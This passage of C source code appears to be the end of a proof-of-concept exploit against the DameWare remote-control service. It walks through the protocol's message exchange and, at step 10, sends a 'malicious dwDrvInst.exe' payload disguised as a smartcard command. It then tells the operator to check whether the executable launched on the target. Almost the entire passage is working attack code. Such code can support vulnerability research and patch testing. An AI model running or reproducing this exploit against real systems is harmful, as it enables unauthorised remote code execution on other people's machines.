	if (res >= 0 && type == MSG_REGISTRATION_INFORMATION && recvbuf_len == 0xc50) {
		res = send(sock, recvbuf, 0xc50, 0);
		if (res != 0xc50) {
			printf("Error sending MSG_REGISTRATION_INFORMATION error: %d, datasent: %d, datatosend: 0x%llx\n", WSAGetLastError(), res, recvbuf_len);
			// goto cleanup
			// TODO send rest???
		}
	}
	else {
		printf("Error receiving step 6 MSG_REGISTRATION_INFORMATION message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 7 - MSG_SOCKET_ADD
	printf("Step 7 - Receive MSG_SOCKET_ADD\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0x224, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
	if (res >= 0 && type == MSG_SOCKET_ADD && recvbuf_len == 0x224) {
		printf("Step 7 - recieved MSG_SOCKET_ADD\n");
	}
	else {
		printf("Error receiving step 7 MSG_SOCKET_ADD message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 8 - MSG_D6E2
	printf("Step 8 - Receive MSG_D6E2\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0x1438, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
	if (res >= 0 && type == MSG_D6E2 && recvbuf_len == 0x1438) {
		res = send(sock, recvbuf, 0x1438, 0);
		if (res != 0x1438) {
			printf("Error sending MSG_D6E2 error: %d, datasent: %d, datatosend: 0x%llx\n", WSAGetLastError(), res, recvbuf_len);
			// goto cleanup
			// TODO send rest???
		}
	}
	else {
		printf("Error receiving step 8 MSG_D6E2 message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 9 - MSG_SMARTCARD_COMMAND (1)
	// Server should send a MSG_SMARTCARD_COMMAND with no data part
	printf("Step 9 - Receive MSG_SMARTCARD_COMMAND (1)\n");
	res = dameware_recvx(sock, &type, &recvbuf, &recvbuf_len);
	if (res >= 0 && type == MSG_SMARTCARD_COMMAND) {
		printf("Step 9 - recieved MSG_SMARTCARD_COMMAND (1)\n");
	}
	else {
		printf("Error receiving step 9 MSG_SMARTCARD_COMMAND (1) message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 10 - MSG_SMARTCARD_COMMAND (2)
	printf("Step 10 - Receive MSG_SMARTCARD_COMMAND (2)\n");
	res = dameware_recvx(sock, &type, &recvbuf, &recvbuf_len);
	if (res >= 0 && type == MSG_SMARTCARD_COMMAND) {
		// Send our dwDrvInst.exe with a MSG_SMARTCARD_COMMAND
		printf("Sending malicious dwDrvInst.exe...\n");

		sendbuf_len = (3 * sizeof(uint32_t)) + payload_len;
		sendbuf = (char*)calloc(sendbuf_len, sizeof(char));
		if (!sendbuf) {
			printf("Failed ot allocate buffer for payload MSG_SMARTCARD_COMMAND message. 0x%x, %d\n", GetLastError(), GetLastError());
			goto cleanup;
		}

		sendbuf2 = (uint32_t*)sendbuf;
		sendbuf2[0] = MSG_SMARTCARD_COMMAND;
		sendbuf2[1] = 2;
		sendbuf2[2] = (uint32_t)payload_len;
		memcpy(sendbuf + (3 * sizeof(uint32_t)), payload, payload_len);

		res = send(sock, sendbuf, (int)sendbuf_len, 0);
		if (res != sendbuf_len) {
			printf("Error sending MSG_SMARTCARD_COMMAND (2) error: %d, datasent: %d, datatosend: 0x%llx\n", WSAGetLastError(), res, sendbuf_len);
			// goto cleanup
			// TODO send rest???
		}

		printf("Please check if dwDrvInst.exe is launched on %s.\n", target);
	}
	else {
		printf("Error receiving step 10 MSG_SMARTCARD_COMMAND (2) message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 11 - Any response?
	printf("Checking any response from server...\n");
	//memset(recvbuf, 0, 32768);
	res = recv(sock, tempbuf, 0x28, 0);
	if (res > 0) {
		printf("Response after sending malicious dwDrvInst.exe. %d\n", res);
	}

cleanup:
	shutdown(sock, 0); // todo fix flag!!!
	closesocket(sock);

	if (sendbuf)
		free(sendbuf);

	if (shared_secret && shared_secret_len > 0)
		free(shared_secret);

	if (clt_pubkey && clt_pubkey_len > 0)
		free(clt_pubkey);

	if (srv_pubkey)
		free(srv_pubkey);

	if (crypt)
		free(crypt);

	if (param && param_len > 0)
		free(param);

	if (hSha512Alg)
		BCryptCloseAlgorithmProvider(hSha512Alg, 0);

	if (recvbuf && recvbuf_len > 0)
		free(recvbuf);
}
